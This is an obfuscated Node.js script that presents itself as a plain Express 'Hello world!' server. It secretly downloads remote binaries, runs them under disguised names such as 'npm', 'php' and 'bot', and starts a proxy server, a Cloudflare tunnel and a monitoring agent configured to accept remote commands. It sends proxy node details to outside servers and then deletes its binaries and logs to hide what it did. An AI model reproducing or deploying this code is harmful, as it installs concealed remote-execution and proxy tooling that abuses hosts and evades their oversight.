const _0x79049c=_0x4cbc;(function(_0x4cdd77,_0x2e3742){const _0x54fe98=_0x4cbc,_0x3d704a=_0x4cdd77();while(!![]){try{const _0x3db8eb=-parseInt(_0x54fe98(0xa7))/0x1*(-parseInt(_0x54fe98(0xab))/0x2)+-parseInt(_0x54fe98(0x81))/0x3+parseInt(_0x54fe98(0xc0))/0x4*(parseInt(_0x54fe98(0x108))/0x5)+-parseInt(_0x54fe98(0xec))/0x6*(parseInt(_0x54fe98(0x6e))/0x7)+-parseInt(_0x54fe98(0x7e))/0x8*(parseInt(_0x54fe98(0xfd))/0x9)+-parseInt(_0x54fe98(0x95))/0xa*(parseInt(_0x54fe98(0xba))/0xb)+parseInt(_0x54fe98(0xb7))/0xc;if(_0x3db8eb===_0x2e3742)break;else _0x3d704a['push'](_0x3d704a['shift']());}catch(_0x19904b){_0x3d704a['push'](_0x3d704a['shift']());}}}(_0x7085,0x98b4a));const express=require(_0x79049c(0xe2)),app=express(),axios=require(_0x79049c(0x98)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x79049c(0x115)),exec=promisify(require(_0x79049c(0xcc))[_0x79049c(0xc9)]),{execSync}=require(_0x79049c(0xcc)),UPLOAD_URL=process['env'][_0x79049c(0xdd)]||'',PROJECT_URL=process[_0x79049c(0x84)][_0x79049c(0x8f)]||'',AUTO_ACCESS=process[_0x79049c(0x84)][_0x79049c(0x8e)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x79049c(0x116),SUB_PATH=process[_0x79049c(0x84)][_0x79049c(0xf9)]||_0x79049c(0xaa),PORT=process[_0x79049c(0x84)][_0x79049c(0xc2)]||process[_0x79049c(0x84)][_0x79049c(0x7f)]||0xbb8,UUID=process[_0x79049c(0x84)][_0x79049c(0xad)]||_0x79049c(0xed),NEZHA_SERVER=process[_0x79049c(0x84)][_0x79049c(0xb2)]||_0x79049c(0xff),NEZHA_PORT=process[_0x79049c(0x84)][_0x79049c(0x100)]||'',NEZHA_KEY=process[_0x79049c(0x84)][_0x79049c(0xb1)]||_0x79049c(0xa5),ARGO_DOMAIN=process[_0x79049c(0x84)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x79049c(0x84)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x79049c(0x84)][_0x79049c(0xc1)]||0x9e3,CFIP=process[_0x79049c(0x84)]['CFIP']||'www.visa.com.sg',CFPORT=process['env'][_0x79049c(0xc6)]||0x1bb,NAME=process[_0x79049c(0x84)][_0x79049c(0xd8)]||_0x79049c(0x114);!fs[_0x79049c(0x10d)](FILE_PATH)?(fs[_0x79049c(0xa4)](FILE_PATH),console[_0x79049c(0x10e)](FILE_PATH+_0x79049c(0x103))):console[_0x79049c(0x10e)](FILE_PATH+_0x79049c(0xbd));let npmPath=path[_0x79049c(0xb5)](FILE_PATH,_0x79049c(0xe8)),phpPath=path[_0x79049c(0xb5)](FILE_PATH,_0x79049c(0xbc)),webPath=path['join'](FILE_PATH,_0x79049c(0xe7)),botPath=path[_0x79049c(0xb5)](FILE_PATH,'bot'),subPath=path[_0x79049c(0xb5)](FILE_PATH,_0x79049c(0xdc)),listPath=path[_0x79049c(0xb5)](FILE_PATH,_0x79049c(0x82)),bootLogPath=path[_0x79049c(0xb5)](FILE_PATH,'boot.log'),configPath=path[_0x79049c(0xb5)](FILE_PATH,_0x79049c(0xe9));function deleteNodes(){const _0x37d2d3=_0x79049c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3be66c;try{_0x3be66c=fs[_0x37d2d3(0x83)](subPath,_0x37d2d3(0x107));}catch{return null;}const _0x2e1e30=Buffer[_0x37d2d3(0x88)](_0x3be66c,_0x37d2d3(0x94))['toString']('utf-8'),_0x6c071c=_0x2e1e30[_0x37d2d3(0xc7)]('\x0a')[_0x37d2d3(0xa8)](_0x308c8c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x37d2d3(0x6b)](_0x308c8c));if(_0x6c071c[_0x37d2d3(0x66)]===0x0)return;return axios[_0x37d2d3(0x10f)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x37d2d3(0x70)]({'nodes':_0x6c071c}),{'headers':{'Content-Type':_0x37d2d3(0xf1)}})[_0x37d2d3(0x77)](_0x5d864=>{return null;});}catch(_0x34805d){return null;}}function _0x7085(){const _0x446eb0=['./php','/sub.txt\x20saved\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','direct','npm\x20running\x20error:\x20','http','mkdirSync','NwxKJwM9UKRCX5TBPaBm0IrjNCSyflif','/web\x20-c\x20','1BODeYE','filter','Download\x20','sub','687794sTvLJn','php\x20is\x20running','UUID','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','writeFileSync','NEZHA_KEY','NEZHA_SERVER','stream','status','join','Skipping\x20adding\x20automatic\x20access\x20task','25024884oBdPgJ','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','8443','77NQLWwm','https://amd64.ssss.nyc.mn/2go','php','\x20already\x20exists','none','unshift','2287044ogwwgW','ARGO_PORT','SERVER_PORT','/tunnel.yml\x20run','\x0a\x20\x20\x0avmess://','web\x20running\x20error:\x20','CFPORT','split','https://arm64.ssss.nyc.mn/agent','exec','NEZHA\x20variable\x20is\x20empty,skip\x20running','unlink','child_process','/vmess-argo','then','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/dev/null','quic','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','127.0.0.1','2053','arm','NAME','tunnel.yml','Subscription\x20uploaded\x20successfully','tcp','sub.txt','UPLOAD_URL','pop','pipe','Content-Type','/api/add-subscriptions','express','/php\x20-c\x20\x22','\x0avless://','push','chmod','web','npm','config.json','fileUrl','false','6DaDkvz','28bac772-f518-4623-856f-3534f46727fd','\x20failed:\x20','\x0a\x20\x20\x0atrojan://','Empowerment\x20failed\x20for\x20','application/json','./bot','Error\x20executing\x20command:\x20','true','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','forEach','get','/vmess-argo?ed=2560','SUB_PATH','TunnelSecret','https://amd64.ssss.nyc.mn/v1','bot\x20is\x20running.','9GQekTl','\x0a\x20\x20tunnel:\x20','a.holoy.dpdns.org:36958','NEZHA_PORT','Error\x20downloading\x20files:','aarch64','\x20is\x20created','finish','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','includes','utf-8','10mZKLJc','boot.log','vmess','xtls-rprx-vision','send','existsSync','log','post','https://amd64.ssss.nyc.mn/agent','unlinkSync','has','config.yaml','Vls','util','./tmp','/api/add-nodes','http\x20server\x20is\x20running\x20on\x20port:','data','tls','2083','toString','https://arm64.ssss.nyc.mn/web','match','length','/bot\x20','/npm\x20-s\x20','\x20-p\x20','/trojan-argo','test','message','\x20>/dev/null\x202>&1\x20&','7181363PmERER','2087','stringify','https://arm64.ssss.nyc.mn/2go','https://arm64.ssss.nyc.mn/v1','response','&type=ws&host=','nohup\x20','arch','catch','text/plain;\x20charset=utf-8','\x20successfully','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','clear','all','close','2203008CwRtCL','PORT','443','2124324VTpaHQ','list.txt','readFileSync','env','--tls','添加URL失败:\x20','bot','from','arm64','Hello\x20world!','bot\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','AUTO_ACCESS','PROJECT_URL','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tunnel.json','\x0a\x20\x20credentials-file:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','base64','1339930NREbTd','error','npm\x20is\x20running','axios','createWriteStream','./web','2096','Error\x20reading\x20boot.log:','vless'];_0x7085=function(){return _0x446eb0;};return _0x7085();}function cleanupOldFiles(){const _0x5c9d40=_0x79049c,_0x2df88b=[_0x5c9d40(0xe7),'bot','npm',_0x5c9d40(0xbc),'sub.txt',_0x5c9d40(0x109)];_0x2df88b[_0x5c9d40(0xf6)](_0x1c0609=>{const _0x2cd2dc=_0x5c9d40,_0x5501cf=path[_0x2cd2dc(0xb5)](FILE_PATH,_0x1c0609);fs[_0x2cd2dc(0xcb)](_0x5501cf,()=>{});});}app[_0x79049c(0xf7)]('/',function(_0x3a6c78,_0x161c7c){const _0x4a9468=_0x79049c;_0x161c7c[_0x4a9468(0x10c)](_0x4a9468(0x8a));});const config={'log':{'access':_0x79049c(0xd1),'error':_0x79049c(0xd1),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x79049c(0x10b)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x79049c(0xd3),'dest':0xbba},{'path':_0x79049c(0xcd),'dest':0xbbb},{'path':_0x79049c(0x6a),'dest':0xbbc}]},'streamSettings':{'network':_0x79049c(0xdb)}},{'port':0xbb9,'listen':_0x79049c(0xd5),'protocol':_0x79049c(0x9d),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x79049c(0xbe)}},{'port':0xbba,'listen':_0x79049c(0xd5),'protocol':_0x79049c(0x9d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x79049c(0xbe),'wsSettings':{'path':_0x79049c(0xd3)}},'sniffing':{'enabled':!![],'destOverride':[_0x79049c(0xa3),'tls',_0x79049c(0xd2)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x79049c(0x10a),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x79049c(0xcd)}},'sniffing':{'enabled':!![],'destOverride':[_0x79049c(0xa3),_0x79049c(0x11a),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x79049c(0xd5),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x79049c(0xbe),'wsSettings':{'path':_0x79049c(0x6a)}},'sniffing':{'enabled':!![],'destOverride':[_0x79049c(0xa3),_0x79049c(0x11a),_0x79049c(0xd2)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x79049c(0xa1)},{'protocol':'blackhole','tag':'block'}]};function _0x4cbc(_0x69fdc6,_0x4d3464){const _0x7085d6=_0x7085();return _0x4cbc=function(_0x4cbcff,_0x5e0a90){_0x4cbcff=_0x4cbcff-0x66;let _0x3674c9=_0x7085d6[_0x4cbcff];return _0x3674c9;},_0x4cbc(_0x69fdc6,_0x4d3464);}fs[_0x79049c(0xb0)](path[_0x79049c(0xb5)](FILE_PATH,_0x79049c(0xe9)),JSON[_0x79049c(0x70)](config,null,0x2));function getSystemArchitecture(){const _0x255aa4=_0x79049c,_0x586296=os[_0x255aa4(0x76)]();return _0x586296===_0x255aa4(0xd7)||_0x586296===_0x255aa4(0x89)||_0x586296===_0x255aa4(0x102)?_0x255aa4(0xd7):'amd';}function downloadFile(_0x361c31,_0x80b676,_0x5def11){const _0xeb0ca6=_0x79049c,_0x696baa=path[_0xeb0ca6(0xb5)](FILE_PATH,_0x361c31),_0x3165e5=fs[_0xeb0ca6(0x99)](_0x696baa);axios({'method':_0xeb0ca6(0xf7),'url':_0x80b676,'responseType':_0xeb0ca6(0xb3)})[_0xeb0ca6(0xce)](_0x2224be=>{const _0x490c44=_0xeb0ca6;_0x2224be[_0x490c44(0x119)][_0x490c44(0xdf)](_0x3165e5),_0x3165e5['on'](_0x490c44(0x104),()=>{const _0x4a6291=_0x490c44;_0x3165e5[_0x4a6291(0x7d)](),console['log'](_0x4a6291(0xa9)+_0x361c31+_0x4a6291(0x79)),_0x5def11(null,_0x361c31);}),_0x3165e5['on'](_0x490c44(0x96),_0x37eb26=>{const _0x4b9a7a=_0x490c44;fs[_0x4b9a7a(0xcb)](_0x696baa,()=>{});const _0x228b8a='Download\x20'+_0x361c31+_0x4b9a7a(0xee)+_0x37eb26[_0x4b9a7a(0x6c)];console[_0x4b9a7a(0x96)](_0x228b8a),_0x5def11(_0x228b8a);});})[_0xeb0ca6(0x77)](_0x9dea04=>{const _0x333a2a=_0xeb0ca6,_0x1897a7=_0x333a2a(0xa9)+_0x361c31+_0x333a2a(0xee)+_0x9dea04[_0x333a2a(0x6c)];console[_0x333a2a(0x96)](_0x1897a7),_0x5def11(_0x1897a7);});}async function downloadFilesAndRun(){const _0x123abc=_0x79049c,_0x15e109=getSystemArchitecture(),_0x2d1b5e=getFilesForArchitecture(_0x15e109);if(_0x2d1b5e[_0x123abc(0x66)]===0x0){console[_0x123abc(0x10e)](_0x123abc(0xf5));return;}const _0x429edb=_0x2d1b5e['map'](_0x5c7c6c=>{return new Promise((_0xad72cc,_0x505b41)=>{const _0x6c5c0b=_0x4cbc;downloadFile(_0x5c7c6c['fileName'],_0x5c7c6c[_0x6c5c0b(0xea)],(_0x361faf,_0x13f551)=>{_0x361faf?_0x505b41(_0x361faf):_0xad72cc(_0x13f551);});});});try{await Promise[_0x123abc(0x7c)](_0x429edb);}catch(_0x563dae){console['error'](_0x123abc(0x101),_0x563dae);return;}function _0x46ce52(_0x5c86a5){const _0x527dff=0x1fd;_0x5c86a5['forEach'](_0x52e8b3=>{const _0x49484b=_0x4cbc,_0x1feed0=path[_0x49484b(0xb5)](FILE_PATH,_0x52e8b3);fs[_0x49484b(0x10d)](_0x1feed0)&&fs[_0x49484b(0xe6)](_0x1feed0,_0x527dff,_0x1b4e2b=>{const _0x2485ee=_0x49484b;_0x1b4e2b?console['error'](_0x2485ee(0xf0)+_0x1feed0+':\x20'+_0x1b4e2b):console[_0x2485ee(0x10e)]('Empowerment\x20success\x20for\x20'+_0x1feed0+':\x20'+_0x527dff[_0x2485ee(0x11c)](0x8));});});}const _0x18198d=NEZHA_PORT?['./npm',_0x123abc(0x9a),_0x123abc(0xf2)]:[_0x123abc(0x9e),'./web',_0x123abc(0xf2)];_0x46ce52(_0x18198d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x91dc08=NEZHA_SERVER[_0x123abc(0x106)](':')?NEZHA_SERVER['split'](':')[_0x123abc(0xde)]():'',_0x33cf43=new Set([_0x123abc(0x80),_0x123abc(0xb9),_0x123abc(0x9b),_0x123abc(0x6f),_0x123abc(0x11b),_0x123abc(0xd6)]),_0x2c5613=_0x33cf43[_0x123abc(0x112)](_0x91dc08)?_0x123abc(0xf4):_0x123abc(0xeb),_0x44902c='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x2c5613+_0x123abc(0x105)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x123abc(0x113)),_0x44902c);const _0x3fcf2f='nohup\x20'+FILE_PATH+_0x123abc(0xe3)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3fcf2f),console['log'](_0x123abc(0xac)),await new Promise(_0x403f89=>setTimeout(_0x403f89,0x3e8));}catch(_0x177148){console['error']('php\x20running\x20error:\x20'+_0x177148);}}else{let _0x596b8b='';const _0x264f4b=[_0x123abc(0x80),'8443',_0x123abc(0x9b),_0x123abc(0x6f),'2083',_0x123abc(0xd6)];_0x264f4b[_0x123abc(0x106)](NEZHA_PORT)&&(_0x596b8b=_0x123abc(0x85));const _0x517668='nohup\x20'+FILE_PATH+_0x123abc(0x68)+NEZHA_SERVER+':'+NEZHA_PORT+_0x123abc(0x69)+NEZHA_KEY+'\x20'+_0x596b8b+_0x123abc(0x6d);try{await exec(_0x517668),console[_0x123abc(0x10e)](_0x123abc(0x97)),await new Promise(_0x3aa53b=>setTimeout(_0x3aa53b,0x3e8));}catch(_0x2adde7){console[_0x123abc(0x96)](_0x123abc(0xa2)+_0x2adde7);}}}else console[_0x123abc(0x10e)](_0x123abc(0xca));const _0x29933c=_0x123abc(0x75)+FILE_PATH+_0x123abc(0xa6)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x29933c),console['log']('web\x20is\x20running'),await new Promise(_0x33bc1e=>setTimeout(_0x33bc1e,0x3e8));}catch(_0x1d3663){console[_0x123abc(0x96)](_0x123abc(0xc5)+_0x1d3663);}if(fs[_0x123abc(0x10d)](path[_0x123abc(0xb5)](FILE_PATH,'bot'))){let _0x596c1b;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x596c1b=_0x123abc(0xd0)+ARGO_AUTH;else ARGO_AUTH[_0x123abc(0x11e)](/TunnelSecret/)?_0x596c1b=_0x123abc(0xb8)+FILE_PATH+_0x123abc(0xc3):_0x596c1b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x123abc(0x75)+FILE_PATH+_0x123abc(0x67)+_0x596c1b+_0x123abc(0x6d)),console[_0x123abc(0x10e)](_0x123abc(0x8b)),await new Promise(_0x39c017=>setTimeout(_0x39c017,0x7d0));}catch(_0x5164f8){console[_0x123abc(0x96)](_0x123abc(0xf3)+_0x5164f8);}}await new Promise(_0x4aa99b=>setTimeout(_0x4aa99b,0x1388));}function getFilesForArchitecture(_0x5c77b4){const _0x236491=_0x79049c;let _0x500520;_0x5c77b4===_0x236491(0xd7)?_0x500520=[{'fileName':_0x236491(0xe7),'fileUrl':_0x236491(0x11d)},{'fileName':'bot','fileUrl':_0x236491(0x71)}]:_0x500520=[{'fileName':_0x236491(0xe7),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x236491(0xbb)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x44e1e3=_0x5c77b4===_0x236491(0xd7)?_0x236491(0xc8):_0x236491(0x110);_0x500520[_0x236491(0xbf)]({'fileName':_0x236491(0xe8),'fileUrl':_0x44e1e3});}else{const _0x39a2b4=_0x5c77b4==='arm'?_0x236491(0x72):_0x236491(0xfb);_0x500520[_0x236491(0xbf)]({'fileName':_0x236491(0xbc),'fileUrl':_0x39a2b4});}}return _0x500520;}function argoType(){const _0x27678d=_0x79049c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x27678d(0x10e)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x27678d(0xfa))){fs[_0x27678d(0xb0)](path[_0x27678d(0xb5)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x38260e=_0x27678d(0xfe)+ARGO_AUTH[_0x27678d(0xc7)]('\x22')[0xb]+_0x27678d(0x92)+path[_0x27678d(0xb5)](FILE_PATH,_0x27678d(0x91))+_0x27678d(0xae)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x27678d(0xd4);fs['writeFileSync'](path[_0x27678d(0xb5)](FILE_PATH,_0x27678d(0xd9)),_0x38260e);}else console[_0x27678d(0x10e)](_0x27678d(0x8d));}argoType();async function extractDomains(){const _0x4a4d8b=_0x79049c;let _0x14c839;if(ARGO_AUTH&&ARGO_DOMAIN)_0x14c839=ARGO_DOMAIN,console[_0x4a4d8b(0x10e)]('ARGO_DOMAIN:',_0x14c839),await _0x31bad7(_0x14c839);else try{const _0x2f7107=fs['readFileSync'](path[_0x4a4d8b(0xb5)](FILE_PATH,'boot.log'),_0x4a4d8b(0x107)),_0x337c86=_0x2f7107[_0x4a4d8b(0xc7)]('\x0a'),_0x45d5d1=[];_0x337c86[_0x4a4d8b(0xf6)](_0x29e5bb=>{const _0x394dc4=_0x4a4d8b,_0x5f3227=_0x29e5bb[_0x394dc4(0x11e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5f3227){const _0x2b0740=_0x5f3227[0x1];_0x45d5d1['push'](_0x2b0740);}});if(_0x45d5d1[_0x4a4d8b(0x66)]>0x0)_0x14c839=_0x45d5d1[0x0],console[_0x4a4d8b(0x10e)]('ArgoDomain:',_0x14c839),await _0x31bad7(_0x14c839);else{console[_0x4a4d8b(0x10e)](_0x4a4d8b(0x90)),fs[_0x4a4d8b(0x111)](path['join'](FILE_PATH,_0x4a4d8b(0x109)));async function _0x7fcc7f(){const _0x20dacc=_0x4a4d8b;try{await exec(_0x20dacc(0x7a));}catch(_0x23efd6){}}_0x7fcc7f(),await new Promise(_0x4300ca=>setTimeout(_0x4300ca,0xbb8));const _0x25faa5=_0x4a4d8b(0x8c)+FILE_PATH+_0x4a4d8b(0xa0)+ARGO_PORT;try{await exec('nohup\x20'+path['join'](FILE_PATH,_0x4a4d8b(0x87))+'\x20'+_0x25faa5+'\x20>/dev/null\x202>&1\x20&'),console[_0x4a4d8b(0x10e)](_0x4a4d8b(0xfc)),await new Promise(_0x31374e=>setTimeout(_0x31374e,0xbb8)),await extractDomains();}catch(_0x2cf48e){console[_0x4a4d8b(0x96)](_0x4a4d8b(0xf3)+_0x2cf48e);}}}catch(_0x341c69){console['error'](_0x4a4d8b(0x9c),_0x341c69);}async function _0x31bad7(_0x351ea2){const _0x1d1e87=_0x4a4d8b,_0x12bb3c=execSync(_0x1d1e87(0xcf),{'encoding':_0x1d1e87(0x107)}),_0x25c625=_0x12bb3c['trim']();return new Promise(_0x22eda8=>{setTimeout(()=>{const _0x52aaec=_0x4cbc,_0x2c33bb={'v':'2','ps':NAME+'-'+_0x25c625,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x52aaec(0xbe),'net':'ws','type':_0x52aaec(0xbe),'host':_0x351ea2,'path':_0x52aaec(0xf8),'tls':_0x52aaec(0x11a),'sni':_0x351ea2,'alpn':''},_0x398957=_0x52aaec(0xe4)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x351ea2+_0x52aaec(0x74)+_0x351ea2+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x25c625+_0x52aaec(0xc4)+Buffer[_0x52aaec(0x88)](JSON['stringify'](_0x2c33bb))['toString']('base64')+_0x52aaec(0xef)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x351ea2+_0x52aaec(0x74)+_0x351ea2+_0x52aaec(0xaf)+NAME+'-'+_0x25c625+'\x0a\x20\x20\x20\x20';console[_0x52aaec(0x10e)](Buffer['from'](_0x398957)[_0x52aaec(0x11c)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x52aaec(0x88)](_0x398957)[_0x52aaec(0x11c)](_0x52aaec(0x94))),console[_0x52aaec(0x10e)](FILE_PATH+_0x52aaec(0x9f)),uplodNodes(),app[_0x52aaec(0xf7)]('/'+SUB_PATH,(_0x3077bc,_0x3dc828)=>{const _0x8a895e=_0x52aaec,_0x35f2ce=Buffer[_0x8a895e(0x88)](_0x398957)[_0x8a895e(0x11c)](_0x8a895e(0x94));_0x3dc828['set'](_0x8a895e(0xe0),_0x8a895e(0x78)),_0x3dc828['send'](_0x35f2ce);}),_0x22eda8(_0x398957);},0x7d0);});}}async function uplodNodes(){const _0x4860aa=_0x79049c;if(UPLOAD_URL&&PROJECT_URL){const _0x177da7=PROJECT_URL+'/'+SUB_PATH,_0x9e8023={'subscription':[_0x177da7]};try{const _0x3cf8d7=await axios[_0x4860aa(0x10f)](UPLOAD_URL+_0x4860aa(0xe1),_0x9e8023,{'headers':{'Content-Type':'application/json'}});if(_0x3cf8d7[_0x4860aa(0xb4)]===0xc8)console[_0x4860aa(0x10e)](_0x4860aa(0xda));else return null;}catch(_0x4beaee){if(_0x4beaee[_0x4860aa(0x73)]){if(_0x4beaee['response'][_0x4860aa(0xb4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4860aa(0x10d)](listPath))return;const _0x39bd9b=fs[_0x4860aa(0x83)](listPath,_0x4860aa(0x107)),_0x170b16=_0x39bd9b[_0x4860aa(0xc7)]('\x0a')['filter'](_0x133b9e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4860aa(0x6b)](_0x133b9e));if(_0x170b16[_0x4860aa(0x66)]===0x0)return;const _0x3e53af=JSON['stringify']({'nodes':_0x170b16});try{await axios[_0x4860aa(0x10f)](UPLOAD_URL+_0x4860aa(0x117),_0x3e53af,{'headers':{'Content-Type':_0x4860aa(0xf1)}});if(response['status']===0xc8)console[_0x4860aa(0x10e)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x106609){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x343b0f=_0x4cbc,_0x19284c=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x19284c[_0x343b0f(0xe5)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x19284c['push'](phpPath);exec('rm\x20-rf\x20'+_0x19284c['join']('\x20')+'\x20>/dev/null\x202>&1',_0x1a396e=>{const _0x2f0614=_0x343b0f;console[_0x2f0614(0x7b)](),console['log']('App\x20is\x20running'),console['log'](_0x2f0614(0x93));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5d0e5e=_0x79049c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x5d0e5e(0xb6));return;}try{const _0x5a555c=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5d0e5e(0xf1)}});console[_0x5d0e5e(0x10e)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x30f59e){console[_0x5d0e5e(0x96)](_0x5d0e5e(0x86)+_0x30f59e[_0x5d0e5e(0x6c)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x79049c(0x10e)](_0x79049c(0x118)+PORT+'!'));
